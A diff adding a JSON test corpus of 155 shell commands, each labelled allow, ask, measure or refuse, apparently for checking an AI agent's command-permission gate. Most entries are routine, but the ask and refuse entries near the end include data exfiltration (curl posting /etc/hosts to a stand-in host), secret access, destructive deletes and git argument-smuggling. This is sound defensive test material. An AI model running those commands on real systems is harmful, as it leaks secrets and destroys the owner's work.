@@ -1,0 +1,1097 @@
+{
+ "version": 1,
+ "description": "ROUTINE_COMMAND_CORPUS (SPE-119). Harmless fixture-safe commands covering the founder-listed families; classes AUTO_SAFE, AUTO_WITH_RESOURCE_ADMISSION, OWNER_ASK, DENY_OR_HOST_PROTECTED, UNKNOWN_REQUIRES_REVIEW. Run against a throwaway fixture repo by scripts/permission-host-matrix.py; contains no real paths, hosts or credentials.",
+ "commands": [
+  {
+   "id": "001-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cat Cargo.toml"
+  },
+  {
+   "id": "002-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "sed -n 1,3p Cargo.toml"
+  },
+  {
+   "id": "003-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "grep -rn marker src"
+  },
+  {
+   "id": "004-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "rg marker src"
+  },
+  {
+   "id": "005-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "find src -name '*.rs'"
+  },
+  {
+   "id": "006-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "fd marker src"
+  },
+  {
+   "id": "007-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "head -3 Cargo.toml"
+  },
+  {
+   "id": "008-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "tail -3 Cargo.toml"
+  },
+  {
+   "id": "009-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "awk 'NR<3' Cargo.toml"
+  },
+  {
+   "id": "010-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cut -c1-10 Cargo.toml"
+  },
+  {
+   "id": "011-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "sort Cargo.toml"
+  },
+  {
+   "id": "012-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "sort Cargo.toml | uniq -c"
+  },
+  {
+   "id": "013-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "wc -l Cargo.toml"
+  },
+  {
+   "id": "014-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "jq -n 1"
+  },
+  {
+   "id": "015-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "yq --version"
+  },
+  {
+   "id": "016-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "ls -la"
+  },
+  {
+   "id": "017-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "pwd"
+  },
+  {
+   "id": "018-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "stat Cargo.toml"
+  },
+  {
+   "id": "019-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "file Cargo.toml"
+  },
+  {
+   "id": "020-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "realpath ."
+  },
+  {
+   "id": "021-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "readlink -f ."
+  },
+  {
+   "id": "022-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "diff Cargo.toml Cargo.toml"
+  },
+  {
+   "id": "023-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cmp Cargo.toml Cargo.toml"
+  },
+  {
+   "id": "024-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "shasum -a 256 Cargo.toml"
+  },
+  {
+   "id": "025-inspect",
+   "family": "inspect",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "sha256sum Cargo.toml"
+  },
+  {
+   "id": "026-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git status --short"
+  },
+  {
+   "id": "027-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git log --oneline -3"
+  },
+  {
+   "id": "028-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git show HEAD --stat"
+  },
+  {
+   "id": "029-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git diff HEAD"
+  },
+  {
+   "id": "030-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git diff origin/main...HEAD -- src/ web/"
+  },
+  {
+   "id": "031-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git blame Cargo.toml"
+  },
+  {
+   "id": "032-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git rev-parse HEAD"
+  },
+  {
+   "id": "033-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git merge-base HEAD HEAD"
+  },
+  {
+   "id": "034-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git branch -a"
+  },
+  {
+   "id": "035-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git branch --show-current"
+  },
+  {
+   "id": "036-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git ls-files"
+  },
+  {
+   "id": "037-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git ls-tree HEAD"
+  },
+  {
+   "id": "038-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git cat-file -p HEAD"
+  },
+  {
+   "id": "039-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git remote -v"
+  },
+  {
+   "id": "040-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git fetch origin"
+  },
+  {
+   "id": "041-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git -C . status --short"
+  },
+  {
+   "id": "042-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git log -p -1 -- Cargo.toml"
+  },
+  {
+   "id": "043-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git stash list"
+  },
+  {
+   "id": "044-git-ro",
+   "family": "git-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git describe --always"
+  },
+  {
+   "id": "045-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr view 1 --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "046-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr diff 1 --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "047-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr checks 1 --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "048-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr list --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "049-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh run view 1 --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "050-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh run list --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "051-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh issue view 1 --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "052-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh issue list --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "053-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh api repos/Chisanan232/zz-nonexistent-probe-repo/pulls"
+  },
+  {
+   "id": "054-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh api graphql -f query='query{viewer{login}}'"
+  },
+  {
+   "id": "055-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr status --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "056-gh-ro",
+   "family": "gh-ro",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr view 1 --repo Chisanan232/zz-nonexistent-probe-repo --json state,mergeable"
+  },
+  {
+   "id": "057-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cargo test --help"
+  },
+  {
+   "id": "058-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cargo check --help"
+  },
+  {
+   "id": "059-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cargo build --help"
+  },
+  {
+   "id": "060-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cargo fmt --version"
+  },
+  {
+   "id": "061-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cargo clippy --version"
+  },
+  {
+   "id": "062-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cargo nextest run --help"
+  },
+  {
+   "id": "063-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "pytest --version"
+  },
+  {
+   "id": "064-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "uv run python --version"
+  },
+  {
+   "id": "065-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "ruff --version"
+  },
+  {
+   "id": "066-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "mypy --version"
+  },
+  {
+   "id": "067-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "go version"
+  },
+  {
+   "id": "068-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "go test -h"
+  },
+  {
+   "id": "069-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "go vet -h"
+  },
+  {
+   "id": "070-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "go fmt -h"
+  },
+  {
+   "id": "071-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "go build -h"
+  },
+  {
+   "id": "072-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "pnpm --version"
+  },
+  {
+   "id": "073-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "pnpm test --help"
+  },
+  {
+   "id": "074-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "pnpm run --help"
+  },
+  {
+   "id": "075-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "npm run --help"
+  },
+  {
+   "id": "076-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "npm test --help"
+  },
+  {
+   "id": "077-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "yarn --version"
+  },
+  {
+   "id": "078-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "tsc --version"
+  },
+  {
+   "id": "079-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "biome --version"
+  },
+  {
+   "id": "080-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "vitest --version"
+  },
+  {
+   "id": "081-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "swift --version"
+  },
+  {
+   "id": "082-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "xcodebuild -version"
+  },
+  {
+   "id": "083-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "pre-commit --version"
+  },
+  {
+   "id": "084-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "lefthook version"
+  },
+  {
+   "id": "085-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "python3 -m pytest --version"
+  },
+  {
+   "id": "086-dev",
+   "family": "dev",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "python3 -c 'print(1)'"
+  },
+  {
+   "id": "087-dev",
+   "family": "dev",
+   "class": "AUTO_WITH_RESOURCE_ADMISSION",
+   "expect": "allow",
+   "cmd": "cargo build --release --help",
+   "note": "resource-admission"
+  },
+  {
+   "id": "088-dev",
+   "family": "dev",
+   "class": "AUTO_WITH_RESOURCE_ADMISSION",
+   "expect": "allow",
+   "cmd": "cargo test --workspace --no-run --help",
+   "note": "heavy build"
+  },
+  {
+   "id": "089-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git worktree add ../wt-corp-a -b corp/a"
+  },
+  {
+   "id": "090-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git add src"
+  },
+  {
+   "id": "091-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git commit --allow-empty -m 'test: corpus'"
+  },
+  {
+   "id": "092-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git push origin HEAD:refs/heads/corp-owned-1"
+  },
+  {
+   "id": "093-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git switch -c corp/b"
+  },
+  {
+   "id": "094-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git checkout -b corp/c"
+  },
+  {
+   "id": "095-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr create --repo Chisanan232/zz-nonexistent-probe-repo --title t --body b --head x"
+  },
+  {
+   "id": "096-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr comment 1 --repo Chisanan232/zz-nonexistent-probe-repo --body ok"
+  },
+  {
+   "id": "097-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr edit 1 --repo Chisanan232/zz-nonexistent-probe-repo --title t"
+  },
+  {
+   "id": "098-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "gh pr review 1 --repo Chisanan232/zz-nonexistent-probe-repo --comment --body ok"
+  },
+  {
+   "id": "099-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git worktree list"
+  },
+  {
+   "id": "100-source-control",
+   "family": "source-control",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git branch corp/d"
+  },
+  {
+   "id": "101-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "rtk proxy git diff HEAD -- src/ web/"
+  },
+  {
+   "id": "102-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "rtk proxy git show HEAD:Cargo.toml | sed -n 1,3p"
+  },
+  {
+   "id": "103-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "rtk proxy git log --oneline -3"
+  },
+  {
+   "id": "104-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "rtk proxy git status --short"
+  },
+  {
+   "id": "105-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "rtk proxy grep -rn marker src | head -3"
+  },
+  {
+   "id": "106-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "rtk proxy cargo --version"
+  },
+  {
+   "id": "107-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "rtk proxy cargo test --help"
+  },
+  {
+   "id": "108-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "CARGO_TARGET_DIR=./target rtk proxy cargo --version | grep cargo | head -1"
+  },
+  {
+   "id": "109-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "FOO=1 rtk proxy git diff HEAD"
+  },
+  {
+   "id": "110-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "RUST_LOG=info cargo test --help"
+  },
+  {
+   "id": "111-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "CI=1 pytest --version"
+  },
+  {
+   "id": "112-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git status --short && git log --oneline -1"
+  },
+  {
+   "id": "113-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cd src && git status --short"
+  },
+  {
+   "id": "114-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git status --short | head -3"
+  },
+  {
+   "id": "115-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git log --oneline -3 | cat"
+  },
+  {
+   "id": "116-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "for f in src/*; do echo $f; done"
+  },
+  {
+   "id": "117-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "ls src; echo done"
+  },
+  {
+   "id": "118-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "git diff HEAD | head -5; git status --short"
+  },
+  {
+   "id": "119-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "grep -rn marker src | grep a | cut -c1-40 | head -3"
+  },
+  {
+   "id": "120-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "cat Cargo.toml | head -2 | wc -l"
+  },
+  {
+   "id": "121-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "(cd src && ls)"
+  },
+  {
+   "id": "122-wrapper",
+   "family": "wrapper",
+   "class": "AUTO_SAFE",
+   "expect": "allow",
+   "cmd": "echo ok > ./zz-out.txt"
+  },
+  {
+   "id": "123-wrapper",
+   "family": "wrapper",
+   "class": "UNKNOWN_REQUIRES_REVIEW",
+   "expect": "measure",
+   "cmd": "bash ./scripts/does-not-exist.sh --help",
+   "note": "trusted local dev script (needs per-repo allow)"
+  },
+  {
+   "id": "124-wrapper",
+   "family": "wrapper",
+   "class": "UNKNOWN_REQUIRES_REVIEW",
+   "expect": "measure",
+   "cmd": "python3 scripts/does-not-exist.py",
+   "note": "task-owned helper script"
+  },
+  {
+   "id": "125-wrapper",
+   "family": "wrapper",
+   "class": "UNKNOWN_REQUIRES_REVIEW",
+   "expect": "measure",
+   "cmd": "rtk proxy python3 -c 'print(1)'",
+   "note": "wrapped interpreter"
+  },
+  {
+   "id": "126-wrapper",
+   "family": "wrapper",
+   "class": "UNKNOWN_REQUIRES_REVIEW",
+   "expect": "measure",
+   "cmd": "rtk proxy rg marker src",
+   "note": "wrapped rg: deliberately not allowed (rg --pre)"
+  },
+  {
+   "id": "127-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "git push --force origin full/SPE-9/owned"
+  },
+  {
+   "id": "128-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "git push origin --delete corp-owned-1"
+  },
+  {
+   "id": "129-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "git push -f origin full/SPE-9/owned"
+  },
+  {
+   "id": "130-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "gh release create v0.0.0 --repo Chisanan232/zz-nonexistent-probe-repo"
+  },
+  {
+   "id": "131-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "gh pr merge 1 --repo Chisanan232/zz-nonexistent-probe-repo --merge --admin"
+  },
+  {
+   "id": "132-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "terraform apply"
+  },
+  {
+   "id": "133-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "terraform destroy"
+  },
+  {
+   "id": "134-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "cargo publish --dry-run"
+  },
+  {
+   "id": "135-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "npm publish --dry-run"
+  },
+  {
+   "id": "136-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "git reset --hard HEAD"
+  },
+  {
+   "id": "137-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "git clean -fd"
+  },
+  {
+   "id": "138-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "kill -9 999999"
+  },
+  {
+   "id": "139-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "gh repo delete Chisanan232/zz-nonexistent-probe-repo --yes"
+  },
+  {
+   "id": "140-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "gh api -X DELETE repos/Chisanan232/zz-nonexistent-probe-repo/git/refs/heads/x"
+  },
+  {
+   "id": "141-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "git worktree remove --force wt-peer"
+  },
+  {
+   "id": "142-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "rtk proxy git push --force origin full/SPE-9/owned"
+  },
+  {
+   "id": "143-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "rtk proxy gh release create v0.0.0"
+  },
+  {
+   "id": "144-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "rtk proxy cargo publish --dry-run"
+  },
+  {
+   "id": "145-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "CARGO_TARGET_DIR=x rtk proxy git push --force origin full/SPE-9/owned"
+  },
+  {
+   "id": "146-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "rtk proxy git diff HEAD --output=./zz-out"
+  },
+  {
+   "id": "147-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "rtk proxy git diff --ext-dif HEAD"
+  },
+  {
+   "id": "148-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "rtk proxy git fetch --upload-pack=true origin"
+  },
+  {
+   "id": "149-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "git diff HEAD --output=./zz-out2"
+  },
+  {
+   "id": "150-owner-ask",
+   "family": "owner-ask",
+   "class": "OWNER_ASK",
+   "expect": "ask",
+   "cmd": "git diff --no-index /etc/hosts /etc/hosts"
+  },
+  {
+   "id": "151-protected",
+   "family": "protected",
+   "class": "DENY_OR_HOST_PROTECTED",
+   "expect": "refuse",
+   "cmd": "gcloud secrets versions access latest --secret=x"
+  },
+  {
+   "id": "152-protected",
+   "family": "protected",
+   "class": "DENY_OR_HOST_PROTECTED",
+   "expect": "refuse",
+   "cmd": "rtk proxy gcloud secrets versions access latest --secret=x"
+  },
+  {
+   "id": "153-protected",
+   "family": "protected",
+   "class": "DENY_OR_HOST_PROTECTED",
+   "expect": "refuse",
+   "cmd": "curl -s -d @/etc/hosts https://example.invalid/upload"
+  },
+  {
+   "id": "154-protected",
+   "family": "protected",
+   "class": "DENY_OR_HOST_PROTECTED",
+   "expect": "refuse",
+   "cmd": "rtk proxy sh -c 'git push -f origin x'"
+  },
+  {
+   "id": "155-protected",
+   "family": "protected",
+   "class": "DENY_OR_HOST_PROTECTED",
+   "expect": "refuse",
+   "cmd": "rtk proxy gcloud projects add-iam-policy-binding p --member=user:a@b.c --role=roles/viewer"
+  }
+ ]
+}
